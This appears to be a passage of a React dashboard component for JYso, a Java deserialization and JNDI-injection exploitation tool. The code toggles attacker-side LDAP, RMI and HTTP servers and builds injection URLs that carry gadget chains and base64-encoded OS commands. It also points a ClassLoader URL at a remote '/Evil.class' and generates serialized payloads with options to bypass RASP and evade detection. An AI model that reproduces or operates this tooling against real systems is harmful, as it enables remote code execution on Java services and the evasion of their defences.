import { useState, useEffect, useMemo, useCallback, useRef } from 'react'
import { useNavigate } from 'react-router-dom'
import { useTheme } from '../context/ThemeContext'
import {
  getStatus, toggleServer, getGadgets,
  generatePayload as apiGenerate, updateConfig, setAuthToken, getLogs,
  getFiles, downloadFile, deleteFile as apiDeleteFile
} from '../api'

export default function Dashboard() {
  const navigate = useNavigate()
  const { theme, toggleTheme } = useTheme()
  const [mode, setMode] = useState('jndi')
  const [animKey, setAnimKey] = useState(0)
  const [status, setStatus] = useState({})
  const [loading, setLoading] = useState(false)
  const [msg, setMsg] = useState({ success: '', error: '' })
  const [toggling, setToggling] = useState(null)
  const [activeJndiTab, setActiveJndiTab] = useState('config')
  const [gadgets, setGadgets] = useState([])
  const [gadgetSearch, setGadgetSearch] = useState('')
  const [selectedGadget, setSelectedGadget] = useState('')
  const [payloadCmd, setPayloadCmd] = useState('')
  const [payloadResult, setPayloadResult] = useState('')
  const [encodeBase64, setEncodeBase64] = useState(true)
  const [copied, setCopied] = useState(false)
  const [showAdvanced, setShowAdvanced] = useState(false)
  const [inherit, setInherit] = useState(false)
  const [obscure, setObscure] = useState(false)
  const [dcfp, setDcfp] = useState('')
  const [dirtyType, setDirtyType] = useState('')
  const [dirtyLength, setDirtyLength] = useState('')
  const [noComSun, setNoComSun] = useState(false)
  const [mozillaClassLoader, setMozillaClassLoader] = useState(false)
  const [rhino, setRhino] = useState(false)
  const [utf8Overlong, setUtf8Overlong] = useState(false)
  const [payloadSubTab, setPayloadSubTab] = useState('gadget')
  const [gadgetOpen, setGadgetOpen] = useState(false)
  const [jndiPayloadResult, setJndiPayloadResult] = useState('')
  const [rmiPayloadResult, setRmiPayloadResult] = useState('')
  const [ldapsPayloadResult, setLdapsPayloadResult] = useState('')
  const [jndiGadgetInput, setJndiGadgetInput] = useState('')
  const [gadgetModeInput, setGadgetModeInput] = useState('')
  const [saveFilename, setSaveFilename] = useState('')
  const [filePath, setFilePath] = useState('')
  const [classLoaderResult, setClassLoaderResult] = useState('')
  const [rmiClassLoaderResult, setRmiClassLoaderResult] = useState('')
  const [ldapsClassLoaderResult, setLdapsClassLoaderResult] = useState('')
  const [routing, setRouting] = useState('ELProcessor')
  const [routingOpen, setRoutingOpen] = useState(false)
  const [logLines, setLogLines] = useState([])
  const [logLoading, setLogLoading] = useState(false)
  const logEndRef = useRef(null)
  const [files, setFiles] = useState([])
  const [filesLoading, setFilesLoading] = useState(false)

  const ROUTING_OPTIONS = ['Basic', 'ELProcessor', 'Groovy', 'jdbcBypass1', 'jdbcBypass2', 'ldap2rmi', 'SnakeYaml', 'XStream', 'MemoryXXE']

  const [configForm, setConfigForm] = useState({
    ip: '', ldapPort: 1389, ldapsPort: 1669, httpPort: 3456, rmiPort: 1099,
    AESkey: '123', user: '', PASSWD: '', TLSProxy: false, keyPass: '', certFile: ''
  })

  const filteredGadgets = useMemo(() => {
    if (!gadgetSearch) return gadgets
    return gadgets.filter(g => g.name.toLowerCase().includes(gadgetSearch.toLowerCase()))
  }, [gadgetSearch, gadgets])

  const switchMode = useCallback((next) => {
    if (next === mode) return
    setMode(next)
    setAnimKey(k => k + 1)
    setMsg({ success: '', error: '' })
  }, [mode])

  async function loadStatus() {
    try {
      const res = await getStatus()
      setStatus(res.data)
      setConfigForm(prev => ({
        ...prev,
        ip: res.data.ip || '',
        ldapPort: res.data.ldapPort || 1389,
        ldapsPort: res.data.ldapsPort || 1669,
        httpPort: res.data.httpPort || 3456,
        rmiPort: res.data.rmiPort || 1099,
        AESkey: res.data.AESkey || '123',
        user: res.data.user || '',
        PASSWD: res.data.PASSWD || '',
        TLSProxy: res.data.TLSProxy || false,
        keyPass: res.data.keyPass || '',
        certFile: res.data.certFile || ''
      }))
    } catch (e) {
      if (e.response && e.response.status === 401) {
        setAuthToken(null)
        navigate('/login', { replace: true })
      }
    }
  }

  async function loadGadgets() {
    try {
      const res = await getGadgets()
      setGadgets(res.data)
    } catch (e) { /* ignore */ }
  }

  async function handleToggleServer(server) {
    setToggling(server)
    setMsg({ success: '', error: '' })
    try {
      const res = await toggleServer(server)
      if (res.data.success) {
        setMsg({ success: server.toUpperCase() + ' ' + (res.data.running ? 'started' : 'stopped'), error: '' })
        setStatus(res.data.status)
      }
    } catch (e) {
      setMsg({ success: '', error: 'Failed to toggle ' + server.toUpperCase() })
    } finally { setToggling(null) }
  }

  async function handleSaveConfig() {
    setLoading(true)
    setMsg({ success: '', error: '' })
    try {
      await updateConfig(configForm)
      setMsg({ success: 'Configuration saved', error: '' })
      loadStatus()
    } catch (e) {
      setMsg({ success: '', error: 'Failed to save configuration' })
    } finally { setLoading(false) }
  }

  async function handleGeneratePayload() {
    const gadgetName = (gadgetModeInput || selectedGadget || '').trim()
    if (!gadgetName) return
    setLoading(true)
    setMsg({ success: '', error: '' })
    try {
      const res = await apiGenerate({ gadget: gadgetName, command: payloadCmd, filename: saveFilename, encodeBase64,
        inherit, obscure, dcfp, dirtyType, dirtyLength, noComSun, mozillaClassLoader, rhino, utf8Overlong })
      if (res.data.success) {
        setPayloadResult(res.data.message || 'Payload generated successfully')
        setMsg({ success: 'Payload generated', error: '' })
        if (res.data.saved) fetchFiles()
      } else {
        setPayloadResult('Error: ' + (res.data.error || 'unknown'))
        setMsg({ success: '', error: res.data.error || 'Generation failed' })
      }
    } catch (e) {
      setMsg({ success: '', error: 'Failed to generate payload' })
    } finally { setLoading(false) }
  }

  async function handleCopyPayload() {
    if (!payloadResult) return
    try {
      await navigator.clipboard.writeText(payloadResult)
      setCopied(true)
      setTimeout(() => setCopied(false), 2000)
    } catch { /* ignore */ }
  }

  async function copyText(text) {
    if (!text) return
    try {
      await navigator.clipboard.writeText(text)
      setCopied(true)
      setTimeout(() => setCopied(false), 2000)
    } catch { /* ignore */ }
  }

  function handleGenerateJndiPayload() {
    const gadgetName = (jndiGadgetInput || selectedGadget || '').trim()
    if (!gadgetName || !payloadCmd) return
    setLoading(true)
    setMsg({ success: '', error: '' })
    setJndiPayloadResult('')
    setRmiPayloadResult('')
    setLdapsPayloadResult('')
    try {
      const bytes = new TextEncoder().encode(payloadCmd)
      const cmdB64 = btoa(String.fromCharCode.apply(null, bytes))
      const ipAddr = configForm.ip || '0.0.0.0'
      const ldapPort = configForm.ldapPort || 1389
      const rmiPort = configForm.rmiPort || 1099
      const ldapsPort = configForm.ldapsPort || 1669

      const ldapUrl = `ldap://${ipAddr}:${ldapPort}/Deserialization/${gadgetName}/command/Base64/${cmdB64}`
      const rmiUrl = `rmi://${ipAddr}:${rmiPort}/Deserialization/${gadgetName}/command/Base64/${cmdB64}`
      const ldapsUrl = `ldaps://${ipAddr}:${ldapsPort}/Deserialization/${gadgetName}/command/Base64/${cmdB64}`

      setJndiPayloadResult(ldapUrl)
      setRmiPayloadResult(rmiUrl)
      setLdapsPayloadResult(ldapsUrl)
      setMsg({ success: 'Payload URLs generated', error: '' })
    } catch (e) {
      setMsg({ success: '', error: 'Failed to generate URL' })
    } finally { setLoading(false) }
  }

  function handleGenerateClassLoader() {
    const fp = filePath.trim()
    const route = routing.trim()
    if (!fp || !route) return
    setLoading(true)
    setMsg({ success: '', error: '' })
    setClassLoaderResult('')
    setRmiClassLoaderResult('')
    setLdapsClassLoaderResult('')
    if (!fp.toLowerCase().endsWith('.class')) {
      setMsg({ success: '', error: 'File path must end with .class' })
      setLoading(false)
      return
    }
    try {
      const ipAddr = configForm.ip || '0.0.0.0'
      const ldapPort = configForm.ldapPort || 1389
      const rmiPort = configForm.rmiPort || 1099
      const ldapsPort = configForm.ldapsPort || 1669

      const ldapUrl = `ldap://${ipAddr}:${ldapPort}/${route}/M-LF-${fp}`
      const rmiUrl = `rmi://${ipAddr}:${rmiPort}/${route}/M-LF-${fp}`
      const ldapsUrl = `ldaps://${ipAddr}:${ldapsPort}/${route}/M-LF-${fp}`

      setClassLoaderResult(ldapUrl)
      setRmiClassLoaderResult(rmiUrl)
      setLdapsClassLoaderResult(ldapsUrl)
      setMsg({ success: 'ClassLoader URLs generated', error: '' })
    } catch (e) {
      setMsg({ success: '', error: 'Failed to generate URL' })
    } finally { setLoading(false) }
  }

  function logout() {
    setAuthToken(null)
    navigate('/login', { replace: true })
  }

  async function fetchLogs() {
    try {
      const res = await getLogs(100)
      setLogLines(res.data.logs || [])
    } catch { /* ignore */ }
  }

  useEffect(() => { loadStatus(); loadGadgets() }, [])

  useEffect(() => {
    if (mode !== 'gadget') return
    fetchFiles()
  }, [mode])

  async function fetchFiles() {
    try {
      const res = await getFiles()
      setFiles(res.data)
    } catch { /* ignore */ }
  }

  async function handleDownloadFile(name) {
    try {
      const res = await downloadFile(name)
      const url = window.URL.createObjectURL(new Blob([res.data]))
      const a = document.createElement('a')
      a.href = url
      a.download = name
      a.click()
      window.URL.revokeObjectURL(url)
    } catch { /* ignore */ }
  }

  async function handleDeleteFile(name) {
    if (!confirm(`Delete ${name}?`)) return
    try {
      await apiDeleteFile(name)
      fetchFiles()
    } catch { /* ignore */ }
  }

  useEffect(() => {
    if (activeJndiTab !== 'logs') return
    fetchLogs()
    const id = setInterval(fetchLogs, 2000)
    return () => clearInterval(id)
  }, [activeJndiTab])

  useEffect(() => {
    if (logEndRef.current) logEndRef.current.scrollIntoView({ behavior: 'smooth' })
  }, [logLines])

  return (
    <div>
      <div className="dashboard-bg" />

      <div className="page-shell">
        <div className="glass-card" style={{ marginBottom: 20 }}>
          <div className="header">
            <h1>
              <span className="logo-dot" />
              JYso
            </h1>
            <div className={'mode-segment-control' + (mode === 'gadget' ? ' gadget-mode' : '')}>
              <button
                className={'mode-segment-btn' + (mode === 'jndi' ? ' active' : '')}
                onClick={() => switchMode('jndi')}
              >
                JNDI EXP
              </button>
              <button
                className={'mode-segment-btn' + (mode === 'gadget' ? ' active' : '')}
                onClick={() => switchMode('gadget')}
              >
                Gadget
              </button>
            </div>
            <div className="header-right">
              <a className="wiki-btn" href="https://github.com/qi4L/JYso/wiki" target="_blank" rel="noopener noreferrer" title="Wiki">
                Wiki
              </a>
              <button
                className="theme-toggle"
                onClick={toggleTheme}
                aria-label={theme === 'light' ? 'Switch to dark mode' : 'Switch to light mode'}
                title={theme === 'light' ? 'Dark mode' : 'Light mode'}
              />
              <button className="logout-btn" onClick={logout}>Logout</button>
            </div>
          </div>
        </div>

        {msg.success && <div className="success-msg section-enter">{msg.success}</div>}
        {msg.error && <div className="error-msg section-enter">{msg.error}</div>}

        <div key={animKey}>
          {mode === 'jndi' && (
            <>
              <div className="glass-card section-enter" style={{ marginBottom: 20 }}>
                <h2>Server Status</h2>
                <div className="status-grid">
                  <div className={'status-item status-clickable' + (toggling === 'ldap' ? ' status-toggling' : '')}
                    onClick={() => handleToggleServer('ldap')}
                    title="Click to toggle LDAP server">
                    <span className="status-label">LDAP ({status.ldapPort})</span>
                    <span className={'status-value ' + (status.ldapRunning ? 'status-online' : 'status-offline')}>
                      {status.ldapRunning ? 'ONLINE' : 'OFFLINE'}
                    </span>
                  </div>
                  <div className={'status-item status-clickable' + (toggling === 'ldaps' ? ' status-toggling' : '')}
                    onClick={() => handleToggleServer('ldaps')}
                    title="Click to toggle LDAPS server">
                    <span className="status-label">LDAPS ({status.ldapsPort})</span>
                    <span className={'status-value ' + (status.ldapsRunning ? 'status-online' : 'status-offline')}>
                      {status.ldapsRunning ? 'ONLINE' : 'OFFLINE'}
                    </span>
                  </div>
                  <div className={'status-item status-clickable' + (toggling === 'http' ? ' status-toggling' : '')}
                    onClick={() => handleToggleServer('http')}
                    title="Click to toggle HTTP server">
                    <span className="status-label">HTTP ({status.httpPort})</span>
                    <span className={'status-value ' + (status.httpRunning ? 'status-online' : 'status-offline')}>
                      {status.httpRunning ? 'ONLINE' : 'OFFLINE'}
                    </span>
                  </div>
                  <div className={'status-item status-clickable' + (toggling === 'rmi' ? ' status-toggling' : '')}
                    onClick={() => handleToggleServer('rmi')}
                    title="Click to toggle RMI server">
                    <span className="status-label">RMI ({status.rmiPort})</span>
                    <span className={'status-value ' + (status.rmiRunning ? 'status-online' : 'status-offline')}>
                      {status.rmiRunning ? 'ONLINE' : 'OFFLINE'}
                    </span>
                  </div>
                  <div className="status-item">
                    <span className="status-label">IP Address</span>
                    <span className="status-value" style={{ color: 'var(--accent)' }}>{status.ip || '0.0.0.0'}</span>
                  </div>
                  <div className="status-item">
                    <span className="status-label">Version</span>
                    <span className="status-value" style={{ color: 'var(--accent)' }}>1.3.8</span>
                  </div>
                </div>
              </div>

              <div className="glass-card section-enter">
                <div className="control-bar">
                  <div className={'tab-segment-control tabs-3' + (activeJndiTab === 'payload' ? ' config-tab' : '') + (activeJndiTab === 'logs' ? ' tab-3' : '')}>
                    <button
                      className={'tab-segment-btn' + (activeJndiTab === 'config' ? ' active' : '')}
                      onClick={() => setActiveJndiTab('config')}
                    >
                      Config
                    </button>
                    <button
                      className={'tab-segment-btn' + (activeJndiTab === 'payload' ? ' active' : '')}
                      onClick={() => setActiveJndiTab('payload')}
                    >
                      Payload
                    </button>
                    <button
                      className={'tab-segment-btn' + (activeJndiTab === 'logs' ? ' active' : '')}
                      onClick={() => setActiveJndiTab('logs')}
                    >
                      Logs
                    </button>
                  </div>
                </div>

                {activeJndiTab === 'config' && (
                  <div key="jndi-config" className="tab-content-enter">
                    <div className="config-form">
                      <div className="form-group">
                        <label>IP Address</label>
                        <input type="text" value={configForm.ip}
                          onChange={e => setConfigForm({ ...configForm, ip: e.target.value })} />
                      </div>
                      <div className="form-group">
                        <label>LDAP Port</label>
                        <input type="number" value={configForm.ldapPort}
                          onChange={e => setConfigForm({ ...configForm, ldapPort: parseInt(e.target.value) || 1389 })} />
                      </div>
                      <div className="form-group">
                        <label>LDAPS Port</label>
                        <input type="number" value={configForm.ldapsPort}
                          onChange={e => setConfigForm({ ...configForm, ldapsPort: parseInt(e.target.value) || 1669 })} />
                      </div>
                      <div className="form-group">
                        <label>HTTP Port</label>
                        <input type="number" value={configForm.httpPort}
                          onChange={e => setConfigForm({ ...configForm, httpPort: parseInt(e.target.value) || 3456 })} />
                      </div>
                      <div className="form-group">
                        <label>RMI Port</label>
                        <input type="number" value={configForm.rmiPort}
                          onChange={e => setConfigForm({ ...configForm, rmiPort: parseInt(e.target.value) || 1099 })} />
                      </div>
                      <div className="form-group">
                        <label>AES Key</label>
                        <input type="text" value={configForm.AESkey}
                          onChange={e => setConfigForm({ ...configForm, AESkey: e.target.value })} />
                      </div>
                      <div className="form-group">
                        <label>LDAP User</label>
                        <input type="text" value={configForm.user} placeholder="ldap bind account"
                          onChange={e => setConfigForm({ ...configForm, user: e.target.value })} />
                      </div>
                      <div className="form-group">
                        <label>LDAP Password</label>
                        <input type="password" value={configForm.PASSWD} placeholder="ldap bind password"
                          onChange={e => setConfigForm({ ...configForm, PASSWD: e.target.value })} />
                      </div>
                      <div className="form-group">
                        <label>JKS Key Password</label>
                        <input type="password" value={configForm.keyPass} placeholder="JKS key password"
                          onChange={e => setConfigForm({ ...configForm, keyPass: e.target.value })} />
                      </div>
                      <div className="form-group">
                        <label>JKS Cert File</label>
                        <input type="text" value={configForm.certFile} placeholder="/path/to/cert.jks"
                          onChange={e => setConfigForm({ ...configForm, certFile: e.target.value })} />
                      </div>
                      <div className="form-group" style={{ gridColumn: 'span 2' }}>
                        <label className="form-group" style={{ marginBottom: 0 }}>
                          <input type="checkbox" checked={configForm.TLSProxy}
                            onChange={e => setConfigForm({ ...configForm, TLSProxy: e.target.checked })} /> TLS Proxy (LDAPS Port Forwarding)
                        </label>
                      </div>
                      <button className="btn btn-primary" onClick={handleSaveConfig} disabled={loading}>
                        {loading ? 'Saving...' : 'Save Configuration'}
                      </button>
                    </div>
                  </div>
                )}

                {activeJndiTab === 'payload' && (
                  <div key="jndi-payload" className="tab-content-enter">
                    <div className="control-bar">
                      <div className={'tab-segment-control' + (payloadSubTab === 'classloader' ? ' config-tab' : '')}>
                        <button
                          className={'tab-segment-btn' + (payloadSubTab === 'gadget' ? ' active' : '')}
                          onClick={() => setPayloadSubTab('gadget')}
                        >
                          Gadget
                        </button>
                        <button
                          className={'tab-segment-btn' + (payloadSubTab === 'classloader' ? ' active' : '')}
                          onClick={() => setPayloadSubTab('classloader')}
                        >
                          ClassLoader
                        </button>
                      </div>
                    </div>

                    {payloadSubTab === 'gadget' && (
                      <div key="payload-gadget" className="tab-content-enter">
                        <div style={{ position: 'relative' }}>
                          <div className="form-group">
                            <label>Gadget</label>
                            <input type="text"
                              value={jndiGadgetInput}
                              placeholder="Type or search..."
                              onFocus={() => setGadgetOpen(true)}
                              onBlur={() => setTimeout(() => setGadgetOpen(false), 150)}
                              onChange={e => { setJndiGadgetInput(e.target.value); setGadgetSearch(e.target.value); }}
                              style={{ cursor: 'text' }}
                            />
                          </div>
                          {gadgetOpen && (
                            <div className="gadget-dropdown" style={{ top: 'calc(100% - 8px)' }}>
                              <div className="gadget-list" style={{ maxHeight: 180, border: 'none', borderRadius: 12 }}>
                                {filteredGadgets.map(g => (
                                  <div key={g.name}
                                    className={'gadget-item' + (selectedGadget === g.name ? ' selected' : '')}
                                    onMouseDown={e => { e.preventDefault(); setSelectedGadget(g.name); setJndiGadgetInput(g.name); setGadgetSearch(g.name); setGadgetOpen(false); }}>
                                    {g.name}
                                  </div>
                                ))}
                              </div>
                            </div>
                          )}
                        </div>
                        <div className="form-group">
                          <label>Command</label>
                          <textarea rows={4} value={payloadCmd} placeholder="e.g. whoami"
                            onChange={e => setPayloadCmd(e.target.value)} />
                        </div>
                        <button className="btn btn-primary" onClick={handleGenerateJndiPayload}
                          disabled={loading || (!(jndiGadgetInput || selectedGadget).trim()) || !payloadCmd}>
                          {loading ? 'Generating...' : 'Generate'}
                        </button>
                        {jndiPayloadResult && (
                          <div className="payload-output" style={{ marginTop: 14, position: 'relative', paddingRight: 42 }}>
                            {jndiPayloadResult}
                            <button className="copy-btn" onClick={() => copyText(jndiPayloadResult)} title="Copy to clipboard">
                              {copied ? (
                                <svg width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M3 8l3 3 7-7" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/></svg>
                              ) : (
                                <svg width="16" height="16" viewBox="0 0 16 16" fill="none"><rect x="5" y="5" width="9" height="9" rx="1.5" stroke="currentColor" strokeWidth="1.5"/><path d="M3 11V3h8" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round"/></svg>
                              )}
                            </button>
                          </div>
                        )}
                        {rmiPayloadResult && (
                          <div className="payload-output" style={{ marginTop: 8, position: 'relative', paddingRight: 42 }}>
                            {rmiPayloadResult}
                            <button className="copy-btn" onClick={() => copyText(rmiPayloadResult)} title="Copy to clipboard">
                              {copied ? (
                                <svg width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M3 8l3 3 7-7" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/></svg>
                              ) : (
                                <svg width="16" height="16" viewBox="0 0 16 16" fill="none"><rect x="5" y="5" width="9" height="9" rx="1.5" stroke="currentColor" strokeWidth="1.5"/><path d="M3 11V3h8" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round"/></svg>
                              )}
                            </button>
                          </div>
                        )}
                        {ldapsPayloadResult && (
                          <div className="payload-output" style={{ marginTop: 8, position: 'relative', paddingRight: 42 }}>
                            {ldapsPayloadResult}
                            <button className="copy-btn" onClick={() => copyText(ldapsPayloadResult)} title="Copy to clipboard">
                              {copied ? (
                                <svg width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M3 8l3 3 7-7" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/></svg>
                              ) : (
                                <svg width="16" height="16" viewBox="0 0 16 16" fill="none"><rect x="5" y="5" width="9" height="9" rx="1.5" stroke="currentColor" strokeWidth="1.5"/><path d="M3 11V3h8" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round"/></svg>
                              )}
                            </button>
                          </div>
                        )}
                      </div>
                    )}

                    {payloadSubTab === 'classloader' && (
                      <div key="payload-classloader" className="tab-content-enter">
                        <div style={{ position: 'relative' }}>
                          <div className="form-group">
                            <label>Routing</label>
                            <input type="text"
                              value={routing}
                              placeholder="Select route..."
                              onFocus={() => setRoutingOpen(true)}
                              onBlur={() => setTimeout(() => setRoutingOpen(false), 150)}
                              onChange={e => setRouting(e.target.value)}
                              style={{ cursor: 'text' }}
                            />
                          </div>
                          {routingOpen && (
                            <div className="gadget-dropdown" style={{ top: 'calc(100% - 8px)' }}>
                              <div className="gadget-list" style={{ maxHeight: 220, border: 'none', borderRadius: 12 }}>
                                {ROUTING_OPTIONS.map(opt => (
                                  <div key={opt}
                                    className={'gadget-item' + (routing === opt ? ' selected' : '')}
                                    onMouseDown={e => { e.preventDefault(); setRouting(opt); setRoutingOpen(false); }}>
                                    {opt}
                                  </div>
                                ))}
                              </div>
                            </div>
                          )}
                        </div>
                        <div className="form-group">
                          <label>FilePath</label>
                          <input type="text" value={filePath}
                            placeholder="e.g. /Evil.class"
                            onChange={e => setFilePath(e.target.value)} />
                        </div>
                        <button className="btn btn-primary" onClick={handleGenerateClassLoader}
                          disabled={loading || !filePath.trim() || !routing.trim()}>
                          {loading ? 'Generating...' : 'Generate'}
                        </button>
                        {classLoaderResult && (
                          <div className="payload-output" style={{ marginTop: 14, position: 'relative', paddingRight: 42 }}>
                            {classLoaderResult}
                            <button className="copy-btn" onClick={() => copyText(classLoaderResult)} title="Copy to clipboard">
                              {copied ? (
                                <svg width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M3 8l3 3 7-7" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/></svg>
                              ) : (
                                <svg width="16" height="16" viewBox="0 0 16 16" fill="none"><rect x="5" y="5" width="9" height="9" rx="1.5" stroke="currentColor" strokeWidth="1.5"/><path d="M3 11V3h8" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round"/></svg>
                              )}
                            </button>
                          </div>
                        )}
                        {rmiClassLoaderResult && (
                          <div className="payload-output" style={{ marginTop: 8, position: 'relative', paddingRight: 42 }}>
                            {rmiClassLoaderResult}
                            <button className="copy-btn" onClick={() => copyText(rmiClassLoaderResult)} title="Copy to clipboard">
                              {copied ? (
                                <svg width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M3 8l3 3 7-7" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/></svg>
                              ) : (
                                <svg width="16" height="16" viewBox="0 0 16 16" fill="none"><rect x="5" y="5" width="9" height="9" rx="1.5" stroke="currentColor" strokeWidth="1.5"/><path d="M3 11V3h8" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round"/></svg>
                              )}
                            </button>
                          </div>
                        )}
                        {ldapsClassLoaderResult && (
                          <div className="payload-output" style={{ marginTop: 8, position: 'relative', paddingRight: 42 }}>
                            {ldapsClassLoaderResult}
                            <button className="copy-btn" onClick={() => copyText(ldapsClassLoaderResult)} title="Copy to clipboard">
                              {copied ? (
                                <svg width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M3 8l3 3 7-7" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/></svg>
                              ) : (
                                <svg width="16" height="16" viewBox="0 0 16 16" fill="none"><rect x="5" y="5" width="9" height="9" rx="1.5" stroke="currentColor" strokeWidth="1.5"/><path d="M3 11V3h8" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round"/></svg>
                              )}
                            </button>
                          </div>
                        )}
                      </div>
                    )}
                  </div>
                )}

                {activeJndiTab === 'logs' && (
                  <div key="jndi-logs" className="tab-content-enter">
                    <div className="log-header">
                      <span>Server Events</span>
                      <button className="btn btn-secondary" style={{ padding: '4px 12px', fontSize: 11, width: 'auto' }}
                        onClick={fetchLogs} disabled={logLoading}>
                        {logLoading ? 'Loading...' : 'Refresh'}
                      </button>
                    </div>
                    <div className="log-container">
                      {logLines.length === 0 ? (
                        <div className="log-empty">No events yet. Start a server or wait for incoming requests.</div>
                      ) : (
                        logLines.map((line, i) => (
                          <div key={i} className="log-line">{line}</div>
                        ))
                      )}
                      <div ref={logEndRef} />
                    </div>
                  </div>
                )}
              </div>
            </>
          )}

          {mode === 'gadget' && (
            <div style={{ display: 'flex', gap: 'var(--card-gap)', alignItems: 'flex-start' }}>
              <div className="glass-card section-enter" style={{ flex: 3, marginBottom: 0 }}>
                <div className="header" style={{ padding: 0, marginBottom: 16 }}>
                <h2>Payload Generator</h2>
                <button
                  className={`btn btn-secondary${showAdvanced ? ' active-tab' : ''}`}
                  style={{ padding: '6px 14px', fontSize: 12, width: 'auto' }}
                  onClick={() => setShowAdvanced(v => !v)}
                >
                  {showAdvanced ? 'Hide Options' : 'Advanced Options'}
                </button>
              </div>
              <div className="control-bar" style={{ marginBottom: 12 }}>
                <label className="form-group" style={{ marginBottom: 0, display: 'flex', alignItems: 'center', gap: 8, cursor: 'pointer' }}>
                  <div className={`base64-toggle${encodeBase64 ? ' active' : ''}`}
                    onClick={() => setEncodeBase64(v => !v)}
                    role="switch"
                    aria-checked={encodeBase64}
                    tabIndex={0}
                    onKeyDown={e => { if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); setEncodeBase64(v => !v); } }}>
                    <div className="base64-toggle-thumb" />
                  </div>
                  <span style={{ fontSize: 13, fontWeight: 500, color: 'var(--text-secondary)' }}>Base64 Encode Output</span>
                </label>
              </div>

              {showAdvanced && (
                <div className="advanced-section section-enter">
                  <div className="adv-grid">
                    <label className="adv-check">
                      <input type="checkbox" checked={inherit} onChange={e => setInherit(e.target.checked)} />
                      <span>Inherit AbstractTranslet <em>(-i)</em></span>
                    </label>
                    <label className="adv-check">
                      <input type="checkbox" checked={obscure} onChange={e => setObscure(e.target.checked)} />
                      <span>Obscure (reflection bypass RASP) <em>(-o)</em></span>
                    </label>
                    <label className="adv-check">
                      <input type="checkbox" checked={noComSun} onChange={e => setNoComSun(e.target.checked)} />
                      <span>Force org.apache.XXX.TemplatesImpl <em>(-ncs)</em></span>
                    </label>
                    <label className="adv-check">
                      <input type="checkbox" checked={mozillaClassLoader} onChange={e => setMozillaClassLoader(e.target.checked)} />
                      <span>Mozilla DefiningClassLoader <em>(-mcl)</em></span>
                    </label>
                    <label className="adv-check">
                      <input type="checkbox" checked={rhino} onChange={e => setRhino(e.target.checked)} />
                      <span>Rhino Engine <em>(-rh)</em></span>
                    </label>
                    <label className="adv-check">
                      <input type="checkbox" checked={utf8Overlong} onChange={e => setUtf8Overlong(e.target.checked)} />
                      <span>UTF-8 Overlong Encoding <em>(-utf)</em></span>
                    </label>
                  </div>
                  <div className="adv-grid" style={{ gridTemplateColumns: '1fr 1fr', marginTop: 10 }}>
                    <div className="form-group" style={{ marginBottom: 0 }}>
                      <label style={{ fontSize: 12 }}>DefineClassFromParameter <em>(-dcfp)</em></label>
                      <input type="text" value={dcfp} placeholder="parameter name"
                        onChange={e => setDcfp(e.target.value)} />
                    </div>
                    <div className="form-group" style={{ marginBottom: 0 }}>
                      <label style={{ fontSize: 12 }}>Dirty Type <em>(-dt)</em></label>
                      <select value={dirtyType} onChange={e => setDirtyType(e.target.value)}
                        style={{ width: '100%', padding: '9px 12px', borderRadius: 'var(--input-radius)', border: '1px solid var(--border-color)', background: 'var(--bg-input)', color: 'var(--text-primary)', fontSize: 13, fontFamily: 'inherit', outline: 'none' }}>
                        <option value="">None</option>
                        <option value="1">1: Random Hashable Collections</option>
                        <option value="2">2: LinkedList Nesting</option>
                        <option value="3">3: TC_RESET in Serialized Data</option>
                      </select>
                    </div>
                    <div className="form-group" style={{ marginBottom: 0 }}>
                      <label style={{ fontSize: 12 }}>Dirty Length <em>(-dl)</em></label>
                      <input type="number" value={dirtyLength} placeholder="length/counts"
                        onChange={e => setDirtyLength(e.target.value)} />
                    </div>
                    <div></div>
                  </div>
                </div>
              )}

              <div style={{ position: 'relative', marginTop: showAdvanced ? 14 : 0 }}>
                <div className="form-group">
                  <label>Gadget</label>
                  <input type="text"
                    value={gadgetModeInput}
                    placeholder="Type or search..."
                    onFocus={() => setGadgetOpen(true)}
                    onBlur={() => setTimeout(() => setGadgetOpen(false), 150)}
                    onChange={e => { setGadgetModeInput(e.target.value); setGadgetSearch(e.target.value); }}
                    style={{ cursor: 'text' }}
                  />
                </div>
                {gadgetOpen && (
                  <div className="gadget-dropdown" style={{ top: 'calc(100% - 8px)' }}>
                    <div className="gadget-list" style={{ maxHeight: 180, border: 'none', borderRadius: 12 }}>
                      {filteredGadgets.map(g => (
                        <div key={g.name}
                          className={'gadget-item' + (selectedGadget === g.name ? ' selected' : '')}
                          onMouseDown={e => { e.preventDefault(); setSelectedGadget(g.name); setGadgetModeInput(g.name); setGadgetSearch(g.name); setGadgetOpen(false); }}>
                          {g.name}
                        </div>
                      ))}
                    </div>
                  </div>
                )}
              </div>
              <div className="form-group">
                <label>Command</label>
                <textarea rows={4} value={payloadCmd} placeholder="e.g. whoami"
                  onChange={e => setPayloadCmd(e.target.value)} />
              </div>
              <div className="form-group">
                <label>Save As (leave empty to discard)</label>
                <input type="text" value={saveFilename}
                  placeholder="e.g. payload.ser"
                  onChange={e => setSaveFilename(e.target.value)} />
              </div>
              <button className="btn btn-primary" onClick={handleGeneratePayload}
                disabled={loading || !(gadgetModeInput || selectedGadget).trim()}>
                {loading ? 'Generating...' : 'Generate'}
              </button>
              {payloadResult && (
                <div className="payload-output" style={{ marginTop: 14, position: 'relative', paddingRight: 42 }}>
                  {payloadResult}
                  <button className="copy-btn" onClick={handleCopyPayload} title="Copy to clipboard">
                    {copied ? (
